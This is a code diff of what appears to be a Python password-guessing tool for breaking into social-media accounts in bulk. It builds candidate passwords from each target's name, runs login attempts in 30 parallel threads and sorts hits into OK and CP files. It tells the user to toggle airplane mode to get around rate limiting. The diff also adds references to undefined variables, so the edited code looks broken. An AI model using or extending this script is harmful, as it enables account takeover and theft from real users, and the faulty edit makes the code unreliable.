@@ -267,27 +267,30 @@ def name():
 				pass
 def name2():
 	clear()
-	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n [✓] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [X] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n 📵 \033[1;97mTurn Airplane Mode✈️On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = ['445566']
+			pwv = ['07867860']
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
 				else:
-					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
+					pwv.append(first786)
+					pwv.append(first123)
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
 				else:
 					pwv.append(nmf)
 					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'1234')
+					pwv.append(frs+'@123')
+					pwv.append(frs+'1122')
 					pwv.append(frs+'786')
+					pwv.append(frs+'@786')
+					pwv.append(frs+'@1122')
+					pwv.append(frs+'12345')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
